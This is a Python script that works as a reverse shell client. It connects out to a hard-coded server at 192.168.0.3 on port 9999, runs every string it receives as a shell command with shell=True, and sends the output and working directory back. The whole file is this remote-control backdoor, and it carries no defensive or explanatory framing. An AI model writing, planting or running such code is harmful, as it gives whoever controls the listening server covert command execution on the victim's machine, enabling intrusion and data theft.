import socket
import os
import subprocess

s=socket.socket()
host="192.168.0.3" #will be the static address of server
port=9999

s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode("utf-8")=='cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) >0:
        cmd=subprocess.Popen(data.decode("utf-8"),
                             shell=True,stdout=subprocess.PIPE,
                             stdin=subprocess.PIPE,
                             stderr=subprocess.PIPE) #open a process to execute the statement
                                #standard error for wrong command
        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_str=str(output_byte,"utf-8")
        currentWD=os.getcwd()+" > " #current working dir
        s.send(str.encode(currentWD+output_str))
        print(output_str)